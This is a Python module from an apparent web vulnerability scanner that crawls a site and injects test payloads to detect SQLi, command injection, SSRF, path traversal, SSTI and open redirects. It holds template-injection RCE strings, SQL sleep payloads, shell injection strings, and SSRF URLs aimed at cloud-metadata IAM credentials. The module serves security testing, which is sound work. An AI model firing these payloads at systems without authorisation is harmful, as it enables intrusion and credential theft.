"""Same-origin crawl + parameter injection (SQLi, cmdi, SSRF, traversal, SSTI, redirect).

Extracted from web.py. Every entry is re-exported through
web/__init__.py's wildcard import so `from recce.services.web import X`
keeps working for the split names too."""
from __future__ import annotations

import base64
import difflib
import hashlib
import hmac
import http.client
import json
import re
import socket
import ssl
import time
from urllib.parse import quote, urlencode, urljoin, urlparse

from ...models import Host, Port, Vuln
from ... import probes, proxy


# Shared primitives — every probe fetches through _fetch / _mk / etc.
from .http import *  # noqa: F401,F403

_CMDI_A, _CMDI_B = 1009, 1013

__all__ = ['_CMDI_A', '_CMDI_B', '_HREF_RE', '_FORM_RE', '_ACTION_RE', '_METHOD_RE', '_INPUT_RE', '_NAME_RE', '_ITYPE_RE', '_same_origin_path', '_parse_form', '_SKIP_TYPES', '_SKIP_NAME', '_fuzzable_fields', 'crawl', '_timed_fetch', '_form_request', '_make_sender', '_body', '_SSTI_ENGINES', '_ssti_identify', '_ssti_finding', '_reflect_via', '_reflect_param', '_SQL_ERRORS', '_SLEEP_PAYLOADS', '_sql_error', '_similar', '_sqli_via', '_CMDI_MARK', '_CMDI_OUT', '_CMDI_SLEEP', '_cmdi_via', '_REDIR_HOST', '_REDIR_PAYLOADS', '_open_redirect_via', '_TRAVERSAL_PAYLOADS', '_TRAVERSAL_HIT', '_FILEISH_PARAM', '_SSRF_PARAM', '_SSRF_PAYLOADS', '_SSTI_PARAM', '_ssrf_via', '_traversal_via', '_SKIP_FORM_ACTION', '_SENSITIVE_FIELD', '_form_risk', '_crawl_findings', '_inject_param', 'scan_crawl']


_HREF_RE = re.compile(r'(?:href|action|src)\s*=\s*["\']?([^"\'>\s]+)', re.I)


_FORM_RE = re.compile(r"<form\b[^>]*>.*?</form>", re.I | re.S)


_ACTION_RE = re.compile(r'action\s*=\s*["\']?([^"\'>\s]+)', re.I)


_METHOD_RE = re.compile(r'method\s*=\s*["\']?([^"\'>\s]+)', re.I)


_INPUT_RE = re.compile(r"<input\b[^>]*>", re.I)


_NAME_RE = re.compile(r'name\s*=\s*["\']?([^"\'>\s]+)', re.I)


_ITYPE_RE = re.compile(r'type\s*=\s*["\']?([^"\'>\s]+)', re.I)




def _same_origin_path(href: str, ip: str, cur_url: str) -> str | None:
    href = (href or "").split("#")[0].strip()
    if not href or href.lower().startswith(("mailto:", "javascript:", "tel:", "data:")):
        return None
    pr = urlparse(urljoin(cur_url, href))
    if pr.scheme not in ("http", "https"):
        return None
    if pr.hostname and pr.hostname != ip:       # same host (IP) only
        return None
    path = pr.path or "/"
    return f"{path}?{pr.query}" if pr.query else path




def _parse_form(html: str, page_path: str) -> dict:
    am = _ACTION_RE.search(html)
    mm = _METHOD_RE.search(html)
    inputs, fields, has_pw, has_token = [], [], False, False
    for inp in _INPUT_RE.findall(html) + re.findall(r"<(?:textarea|select)\b[^>]*>", html, re.I):
        nm = _NAME_RE.search(inp)
        tm = _ITYPE_RE.search(inp)
        name = nm.group(1) if nm else ""
        itype = (tm.group(1).lower() if tm else "text")
        if itype == "password":
            has_pw = True
        if name and re.search(r"csrf|token|authenticity|nonce", name, re.I):
            has_token = True
        if name:
            inputs.append(name)
            fields.append((name, itype))
    return {"action": am.group(1) if am else page_path,
            "method": (mm.group(1).lower() if mm else "get"),
            "inputs": inputs, "fields": fields, "password": has_pw, "csrf": has_token}


_SKIP_TYPES = {"password", "submit", "button", "image", "file", "reset", "hidden"}


_SKIP_NAME = re.compile(r"csrf|token|authenticity|nonce|captcha|__viewstate", re.I)




def _fuzzable_fields(form: dict) -> list[str]:
    """Form field names worth injecting into: skip passwords, submit buttons, file
    uploads, and anti-CSRF/hidden token fields. Bounded to keep the request budget sane."""
    out = []
    for name, itype in form.get("fields") or [(n, "text") for n in form.get("inputs", [])]:
        if itype in _SKIP_TYPES or _SKIP_NAME.search(name):
            continue
        if name not in out:
            out.append(name)
    return out[:6]




def crawl(ip: str, port: Port, auth: dict | None = None,
          max_pages: int = 40, max_depth: int = 2) -> dict:
    """Same-origin BFS crawl (as the authenticated user if `auth` is set). Returns
    {'pages': [...], 'forms': [...], 'params': [(path, name), ...]}."""
    from collections import deque
    base = url_for(ip, port)
    seen = {"/"}
    q = deque([("/", 0)])
    pages: list[dict] = []
    forms: list[dict] = []
    params: list[tuple] = []
    pseen: set = set()
    while q and len(pages) < max_pages:
        path, depth = q.popleft()
        r = _fetch(ip, port, path, auth=auth)
        if not r:
            continue
        status, headers, body = r
        pages.append({"path": path, "status": status})
        if "?" in path:
            bp, qs = path.split("?", 1)
            for kv in qs.split("&"):
                if "=" in kv:
                    key = (bp, kv.split("=", 1)[0])
                    if key not in pseen:
                        pseen.add(key)
                        params.append(key)
        if "html" not in headers.get("content-type", "").lower() and body.lstrip()[:1] != "<":
            continue
        cur_url = base + path
        for href in _HREF_RE.findall(body):
            npath = _same_origin_path(href, ip, cur_url)
            if npath and npath not in seen:
                seen.add(npath)
                if depth < max_depth:
                    q.append((npath, depth + 1))
        for fm in _FORM_RE.findall(body):
            forms.append(_parse_form(fm, path))
    return {"pages": pages, "forms": forms, "params": params[:15]}



def _timed_fetch(ip, port, path, method="GET", body=None, auth=None):
    t0 = time.monotonic()
    r = _fetch(ip, port, path, method=method, body=body, auth=auth)
    return r, time.monotonic() - t0




def _form_request(form: dict, param: str, payload: str):
    """(method, path, body, ctype) that sets `param`=payload and holds the form's other
    fields at a benign baseline value ('1')."""
    fields = {n: "1" for n in form.get("inputs", [])}
    fields[param] = payload
    enc = urlencode(fields)
    if (form.get("method") or "get").lower() == "post":
        return "POST", form["action"], enc, "application/x-www-form-urlencoded"
    sep = "&" if "?" in form["action"] else "?"
    return "GET", f"{form['action']}{sep}{enc}", None, None




def _make_sender(ip: str, port: Port, kind: str, obj, param: str, auth):
    """Return send(payload) -> (response_or_None, elapsed_seconds). `kind` is 'get'
    (obj = path, inject a query param) or 'form' (obj = parsed form, inject a field)."""
    def send(payload: str):
        if kind == "get":
            sep = "&" if "?" in obj else "?"
            return _timed_fetch(ip, port, f"{obj}{sep}{param}=" + quote(payload), auth=auth)
        method, path, body, ctype = _form_request(obj, param, payload)
        extra = dict(auth or {})
        if ctype:
            extra["Content-Type"] = ctype
        return _timed_fetch(ip, port, path, method=method, body=body, auth=extra or None)
    return send




def _body(sr):
    r = sr[0] if sr else None
    return r[2] if r and len(r) > 2 else None


_SSTI_ENGINES = [
    ("recceX{{7*'7'}}recceX", "recceX7777777recceX", "Jinja2 (Python)",
     "{{ cycler.__init__.__globals__.os.popen('id').read() }}"),
    ("recceX{{7*'7'}}recceX", "recceX49recceX", "Twig (PHP)",
     "{{['id']|filter('system')}}  (or registerUndefinedFilterCallback('system') → getFilter('id'))"),
    ("recceY${7*'7'}recceY", "recceY7777777recceY", "Mako (Python)",
     "${__import__('os').popen('id').read()}"),
    ("recceZ${7*7}recceZ", "recceZ49recceZ", "Freemarker (Java)",
     "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"),
    ("recceS{7*7}recceS", "recceS49recceS", "Smarty (PHP)", "{system('id')}"),
    ("recceW<%=7*7%>recceW", "recceW49recceW", "ERB / JSP",
     "<%= `id` %> (ERB)  /  <%= Runtime.getRuntime().exec(\"id\") %> (JSP)"),
]




def _ssti_identify(probe) -> tuple[str, str]:
    """`probe(payload) -> body`. Returns (engine, rce_payload) or ("", "")."""
    for payload, marker, engine, rce in _SSTI_ENGINES:
        b = probe(payload)
        if b and marker in b:
            return engine, rce
    return "", ""




def _ssti_finding(ip, port, where, engine, rce):
    title = "Server-Side Template Injection"
    detail = f"{where} evaluated our template payload to 49 - the engine executed our input."
    if engine:
        title += f" — {engine} (RCE)"
        detail += f"\n\nEngine: {engine}. RCE payload: {rce}"
    return _mk(ip, port, "web-ssti", "high" if not engine else "critical", title,
               ["CWE-1336", "CWE-94"], detail,
               "Never render user input as a template; use a sandboxed/logic-less engine "
               "and escape all input.", confidence="confirmed")




def _reflect_via(ip: str, port: Port, where: str, send) -> list[Vuln]:
    b = _body(send("recceA{{7*7}}recceD<i>"))
    if not b:
        return []
    if "recceA49" in b:
        engine, rce = _ssti_identify(lambda p: _body(send(p)) or "")
        return [_ssti_finding(ip, port, where, engine, rce)]
    if "recceD<i>" in b:
        return [_mk(ip, port, "web-reflected", "medium",
                    f"Input reflected unencoded in {where} (reflected-XSS lead)", ["CWE-79"],
                    f"{where} reflected '<i>' unencoded - verify for XSS.",
                    "Context-encode reflected user input.", confidence="potential")]
    return []




def _reflect_param(ip: str, port: Port, page_path: str, param: str, auth) -> list[Vuln]:
    return _reflect_via(ip, port, f"param '{param}' on {page_path}",
                        _make_sender(ip, port, "get", page_path, param, auth))


_SQL_ERRORS = [
    (re.compile(r"SQL syntax.*?MySQL|check the manual that corresponds to your (MySQL|MariaDB)|"
                r"MySqlException|valid MySQL result|com\.mysql\.jdbc|mysqli?_", re.I), "MySQL"),
    (re.compile(r"PostgreSQL.*?ERROR|pg_query\(\)|PSQLException|syntax error at or near|"
                r"unterminated quoted string|org\.postgresql", re.I), "PostgreSQL"),
    (re.compile(r"Microsoft SQL Server|ODBC SQL Server Driver|SQLServerException|"
                r"Unclosed quotation mark after|Incorrect syntax near|System\.Data\.SqlClient",
                re.I), "MSSQL"),
    (re.compile(r"ORA-[0-9]{5}|Oracle error|quoted string not properly terminated|"
                r"PLS-[0-9]{5}|oracle\.jdbc", re.I), "Oracle"),
    (re.compile(r"SQLite/JDBCDriver|SQLiteException|sqlite3\.OperationalError|"
                r"unrecognized token|near \".{0,20}\": syntax error", re.I), "SQLite"),
    (re.compile(r"SQLSTATE\[|DB2 SQL error|Sybase message|Npgsql\.|"
                r"java\.sql\.SQLException", re.I), "SQL"),
]


_SLEEP_PAYLOADS = [
    "1' AND SLEEP(§)-- -",                              # MySQL (string context)
    "1 AND SLEEP(§)",                                   # MySQL (numeric context)
    "1' AND 1=(SELECT 1 FROM PG_SLEEP(§))-- -",         # PostgreSQL
    "1';WAITFOR DELAY '0:0:§'-- -",                     # MSSQL (delay only)
]




def _sql_error(body: str):
    for rx, lbl in _SQL_ERRORS:
        if rx.search(body or ""):
            return lbl
    return None




def _similar(a, b) -> float:
    if a is None or b is None:
        return 0.0
    return difflib.SequenceMatcher(None, a[:3000], b[:3000]).ratio()




def _sqli_via(ip: str, port: Port, where: str, send, time_based: bool = False) -> list[Vuln]:
    """Error-based + boolean-based (default) and, opt-in, time-based SQLi on one input.
    Returns at most one finding (the strongest technique that fires)."""
    def mk(tech, detail):
        return [_mk(ip, port, "web-sqli", "high",
                    f"SQL injection in {where} ({tech})", ["CWE-89"], detail,
                    "Use parameterised queries / prepared statements; never build SQL by "
                    "string concatenation. Validate + canonicalise input.")]

    # 1) Error-based: a DBMS error that appears only after we break out of the quote.
    base = _body(send("1"))
    if base is not None and not _sql_error(base):
        for q in ("'", "\"", "')", "\\"):
            rb = _body(send("1" + q))
            lbl = _sql_error(rb) if rb is not None else None
            if lbl:
                return mk(f"error-based, {lbl}",
                          f"Injecting {q!r} into {where} triggered a {lbl} database error - "
                          "the app passed our input straight into a SQL query.")

    # 2) Boolean-based blind: TRUE ~ baseline, FALSE diverges, and it reproduces.
    b1, b2 = _body(send("1")), _body(send("1"))
    if b1 and b2 and _similar(b1, b2) >= 0.95:          # skip highly dynamic pages
        for tp, fp in (("1 AND 1=1", "1 AND 1=2"), ("1' AND '1'='1", "1' AND '1'='2")):
            bt, bf = _body(send(tp)), _body(send(fp))
            if not bt or not bf:
                continue
            if _similar(bt, b1) >= 0.95 and _similar(bf, b1) <= 0.9 and _similar(bt, bf) <= 0.9:
                bt2, bf2 = _body(send(tp)), _body(send(fp))   # confirm it reproduces
                if bt2 and bf2 and _similar(bt2, b1) >= 0.95 and _similar(bf2, b1) <= 0.9:
                    return mk("boolean-based blind",
                              f"A true condition ({tp!r}) returned the baseline page while a "
                              f"false one ({fp!r}) returned a different page - the app evaluates "
                              "our injected SQL boolean.")

    # 3) Time-based blind (opt-in): a DB sleep delays the response, scaling with the arg.
    if time_based:
        samples = [el for el in (send("1")[1], send("1")[1])]
        base_t = sorted(samples)[len(samples) // 2] if samples else 0.0
        for tmpl in _SLEEP_PAYLOADS:
            _, e5 = send(tmpl.replace("§", "5"))
            if e5 >= base_t + 4.0:
                _, e2 = send(tmpl.replace("§", "2"))        # must scale with the sleep arg
                if (e5 - e2) >= 1.5:
                    return mk("time-based blind",
                              "A sleep payload delayed the response ~5s (and ~2s for the 2s "
                              "variant), so our injected SQL controls execution time.")
    return []


_CMDI_MARK = f"cmdi{_CMDI_A * _CMDI_B}"                  # cmdi1022117


_CMDI_OUT = [
    f"; echo cmdi$(({_CMDI_A}*{_CMDI_B}))",
    f"| echo cmdi$(({_CMDI_A}*{_CMDI_B}))",
    f"$(echo cmdi$(({_CMDI_A}*{_CMDI_B})))",
    f"`echo cmdi$(({_CMDI_A}*{_CMDI_B}))`",
    f"%0aecho cmdi$(({_CMDI_A}*{_CMDI_B}))",
    f"; echo cmdi`expr {_CMDI_A} \\* {_CMDI_B}`",
    f"& set /a cmdi=cmdi{_CMDI_A}*{_CMDI_B}",           # (best-effort Windows arithmetic)
]


_CMDI_SLEEP = ["; sleep §", "| sleep §", "$(sleep §)", "`sleep §`", "&& sleep §",
               "& ping -n § 127.0.0.1", "%0asleep §"]




def _cmdi_via(ip: str, port: Port, where: str, param: str, send,
              time_based: bool = False) -> list[Vuln]:
    """OS command injection. Output-based (a shell-computed marker reflection can't fake)
    plus, opt-in, time-based (a sleep that scales the response delay)."""
    def mk(tech, detail):
        return [_mk(ip, port, "web-cmdi", "critical",
                    f"OS command injection in {where} ({tech})", ["CWE-78"], detail,
                    "Never pass user input to a shell; call the program directly with an "
                    "argument array / a safe library API; allow-list + validate input.",
                    confidence="confirmed")]

    for p in _CMDI_OUT:
        b = _body(send(p))
        if b and _CMDI_MARK in b:
            return mk("output-based",
                      f"{where} set to {p!r} made the response contain {_CMDI_MARK!r} - the "
                      "shell evaluated our arithmetic, so the app runs our input in a shell.")
    if time_based:
        samples = [send("1")[1], send("1")[1]]
        base_t = min(samples) if samples else 0.0
        for tmpl in _CMDI_SLEEP:
            _, e5 = send(tmpl.replace("§", "5"))
            if e5 >= base_t + 4.0:
                _, e2 = send(tmpl.replace("§", "2"))        # must scale with the sleep arg
                if (e5 - e2) >= 1.5:
                    return mk("time-based",
                              "A sleep payload delayed the response ~5s (and ~2s for the 2s "
                              "variant), so our input controls a shell's execution time.")
    return []


_REDIR_HOST = "recce-oob.example"                       # a host we'll never legitimately host


_REDIR_PAYLOADS = (f"https://{_REDIR_HOST}/x", f"//{_REDIR_HOST}/x", f"/\\{_REDIR_HOST}/x")




def _open_redirect_via(ip: str, port: Port, where: str, send) -> list[Vuln]:
    """A parameter reflected into the Location of a 3xx pointing at an attacker host.
    Reads the redirect only (http.client does not auto-follow) - non-destructive."""
    for payload in _REDIR_PAYLOADS:
        r = send(payload)[0]
        if not r or not (300 <= r[0] < 400):
            continue
        loc = (r[1].get("location") or "").strip()
        low = loc.lower()
        if low.startswith((f"https://{_REDIR_HOST}", f"http://{_REDIR_HOST}",
                           f"//{_REDIR_HOST}", f"/\\{_REDIR_HOST}")):
            return [_mk(ip, port, "web-openredirect", "medium",
                        f"Open redirect via {where}", ["CWE-601"],
                        f"{where} set to {payload!r} -> HTTP {r[0]} Location: {loc[:120]} "
                        "(redirects to an attacker-controlled host).",
                        "Allow-list redirect targets; never redirect to a raw user value.",
                        confidence="confirmed")]
    return []


_TRAVERSAL_PAYLOADS = (
    "../../../../../../../../etc/passwd",
    "....//....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
    "../../../../../../../../windows/win.ini",
)


_TRAVERSAL_HIT = re.compile(r"root:.*?:0:0:|\[fonts\]|\[extensions\]", re.I)


_FILEISH_PARAM = re.compile(
    r"file|path|page|template|doc|download|include|dir|folder|load|read|view|attachment|img|src",
    re.I)


_SSRF_PARAM = re.compile(
    r"url|uri|link|src|source|dest|target|redirect|feed|image|img|host|domain|callback|"
    r"webhook|proxy|fetch|remote|load|open|site|endpoint|server|address|api|next|"
    r"return|continue|to|out|data|resource|path|file|document|view|window|port", re.I)


_SSRF_PAYLOADS = [
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     re.compile(r"AccessKeyId|SecretAccessKey|\bToken\b|Expiration"),
     "AWS IAM credentials via IMDS"),
    ("http://169.254.169.254/latest/user-data",
     re.compile(r"#!/bin|aws|password|secret|key", re.I),
     "AWS user-data script (may contain creds)"),
    ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=http://attacker.com",
     re.compile(r"eyJ"), "GCP service-account identity token (JWT)"),
    ("http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
     re.compile(r"vmId|subscriptionId|resourceGroupName"),
     "Azure compute instance metadata"),
    ("http://100.100.100.200/latest/meta-data/",
     re.compile(r"instance-id|hostname|region"),
     "Alibaba Cloud instance metadata"),
    ("file:///etc/passwd", re.compile(r"root:.*:0:0:"),
     "local file /etc/passwd via file://"),
    ("file:///proc/self/environ", re.compile(r"PATH|HOME|USER|SECRET|KEY", re.I),
     "/proc/self/environ via file:// (environment variables leak)"),
]


_SSTI_PARAM = re.compile(
    r"template|msg|message|text|content|input|search|query|name|title|comment|feedback|email",
    re.I)




def _ssrf_via(ip: str, port: Port, where: str, param: str, send) -> list[Vuln]:
    """Point a URL-ish parameter at cloud-metadata / file:// and confirm SSRF when the
    server fetches it and the metadata/file content comes back in the response. A
    baseline request against a non-metadata URL rules out a server that echoes the
    same marker string on every response - without that control a page emitting
    'AccessKeyId' on any request produced one critical false positive per param."""
    if not _SSRF_PARAM.search(param):
        return []
    baseline = _body(send("http://127.0.0.1:1/recce-baseline")) or ""
    for payload, marker, what in _SSRF_PAYLOADS:
        b = _body(send(payload))
        if not (b and marker.search(b)):
            continue
        if marker.search(baseline):
            continue                          # marker is baseline noise, not SSRF proof
        cloud = "metadata" in what.lower() or "imds" in what.lower()
        sev = "critical" if cloud else "high"
        return [_mk(ip, port, "web-ssrf", sev,
                    f"Server-Side Request Forgery via {where}", ["CWE-918"],
                    f"{where} set to {payload!r} caused the server to fetch it and the "
                    f"response returned {what} - SSRF confirmed (the app requests a "
                    "URL taken from our input).",
                    "Allow-list outbound destinations; block link-local/metadata IPs "
                    "(169.254.169.254); enforce IMDSv2; disable file://.",
                    confidence="confirmed")]
    return []




def _traversal_via(ip: str, port: Port, where: str, param: str, send) -> list[Vuln]:
    if not _FILEISH_PARAM.search(param):
        return []
    for payload in _TRAVERSAL_PAYLOADS:
        b = _body(send(payload))
        if b and _TRAVERSAL_HIT.search(b):
            what = "/etc/passwd" if "win.ini" not in payload else "windows/win.ini"
            return [_mk(ip, port, "web-lfi", "high",
                        f"Path traversal / local file read via {where}", ["CWE-22"],
                        f"{where} set to {payload!r} returned {what} content "
                        "(the app reads a file path from our input).",
                        "Canonicalise + allow-list file paths; never build a path from raw "
                        "user input.", confidence="confirmed")]
    return []


_SKIP_FORM_ACTION = re.compile(
    r"delete|remove|destroy|\bdrop\b|wipe|purge|reset|revoke|disable|deactivate|ban|"
    r"kick|logout|sign.?out|transfer|pay(ment)?|checkout|order|buy|purchase|invite|"
    r"subscribe|unsubscribe|register|sign.?up|upload|import|export|\bsend\b|e?mail|"
    r"message|comment|publish|deploy|exec(ute)?|restart|reboot|shutdown|approve", re.I)


_SENSITIVE_FIELD = re.compile(
    r"amount|price|\bqty\b|quantity|total|card|cvv|cvc|iban|swift|routing|account|"
    r"recipient|payee|e?mail|phone|mobile|\bssn\b|\bdob\b|message|subject|\bbody\b|"
    r"comment|content|\botp\b|\bpin\b|upload|attachment", re.I)




def _form_risk(form: dict, allow_risky: bool = False) -> str:
    """Reason this form should NOT be auto-submitted during fuzzing (side-effect risk),
    or '' if it is safe to fuzz. A file-upload form is never auto-submitted. With
    allow_risky the state-change/transaction guards are relaxed (uploads still skipped)."""
    for name, itype in form.get("fields") or []:
        if itype == "file":
            return f"has a file-upload field '{name}'"
    if allow_risky:
        return ""
    action = form.get("action", "")
    if _SKIP_FORM_ACTION.search(action):
        return f"action '{action[:60]}' looks state-changing"
    for name, _itype in form.get("fields") or []:
        if _SENSITIVE_FIELD.search(name):
            return f"has a sensitive/transactional field '{name}'"
    return ""




def _crawl_findings(ip: str, port: Port, cres: dict) -> list[Vuln]:
    out: list[Vuln] = []
    tls = probes._is_tls(port)
    for f in cres["forms"]:
        if f["password"] and not tls:
            out.append(_mk(ip, port, "web-cleartext-login", "high",
                           "Password form submitted over cleartext HTTP", ["CWE-319"],
                           f"A login form (action {f['action']}) submits credentials over HTTP.",
                           "Serve authentication over HTTPS + HSTS."))
        if f["method"] == "post" and f["password"] and not f["csrf"]:
            out.append(_mk(ip, port, "web-csrf", "low",
                           "Login/POST form without an anti-CSRF token", ["CWE-352"],
                           f"Form action {f['action']} (POST, password) has no csrf/token hidden field.",
                           "Add a per-session anti-CSRF token.", confidence="potential"))
    return out




def _inject_param(ip, port, where, param, send, sqli, time_based):
    """Run every input-injection check against one parameter/field via its `send`
    closure: reflection/SSTI, SQLi (optional), open redirect, path traversal."""
    fs = _reflect_via(ip, port, where, send)
    if sqli:
        fs += _sqli_via(ip, port, where, send, time_based)
    fs += _open_redirect_via(ip, port, where, send)
    fs += _traversal_via(ip, port, where, param, send)
    fs += _ssrf_via(ip, port, where, param, send)
    fs += _cmdi_via(ip, port, where, param, send, time_based)
    return fs




def scan_crawl(host: Host, auth: dict | None = None, sqli: bool = True,
               time_based: bool = False, fuzz_risky: bool = False) -> tuple[int, int]:
    """Crawl every web endpoint (authenticated if auth is set), test discovered GET
    params AND form fields for reflection/SSTI, SQL injection, open redirect and path
    traversal, and flag risky forms. `time_based` opts into the slower time-blind SQLi
    probe. Forms whose action/fields signal a real side effect (delete / pay / send /
    upload / ...) are NOT submitted - they're recorded so the operator tests them by
    hand; `fuzz_risky=True` relaxes that (file uploads are still never submitted).
    Returns (pages_crawled, findings_added)."""
    existing = {v.key for v in host.vulns}
    pages = added = 0
    for port in host.open_ports:
        if not is_web(port):
            continue
        cres = crawl(host.ip, port, auth=auth)
        pages += len(cres["pages"])
        fs = _crawl_findings(host.ip, port, cres)
        budget = 24                        # cap injectable targets per endpoint

        # Discovered GET query params (idempotent - always safe to fuzz).
        for pth, prm in cres["params"]:
            if budget <= 0:
                break
            send = _make_sender(host.ip, port, "get", pth, prm, auth)
            fs += _inject_param(host.ip, port, f"param '{prm}' on {pth}", prm,
                                send, sqli, time_based)
            budget -= 1

        # Form fields (POST/GET bodies). Skip forms that would cause a side effect,
        # and record them so nothing is silently untested.
        skipped: list[str] = []
        for form in (cres["forms"] or [])[:6]:
            risk = _form_risk(form, allow_risky=fuzz_risky)
            where_base = f"form {(form.get('method') or 'get').upper()} {form['action']}"
            if risk:
                skipped.append(f"{where_base} ({risk})")
                continue
            for prm in _fuzzable_fields(form):
                if budget <= 0:
                    break
                send = _make_sender(host.ip, port, "form", form, prm, auth)
                fs += _inject_param(host.ip, port, f"field '{prm}' of {where_base}", prm,
                                    send, sqli, time_based)
                budget -= 1
        if skipped:
            fs.append(_mk(host.ip, port, "web-form-unfuzzed", "info",
                          "Form(s) not auto-fuzzed (side-effect risk) - test by hand",
                          ["CWE-200"],
                          "recce did NOT submit these forms to avoid side effects; review "
                          "them manually (or re-run --crawl --fuzz-risky-forms on a "
                          "throwaway target):\n  " + "\n  ".join(skipped[:12]),
                          "N/A - operator note.", confidence="potential"))

        for v in fs:
            if v.key in existing:
                continue
            existing.add(v.key)
            host.vulns.append(v)
            added += 1
    return pages, added
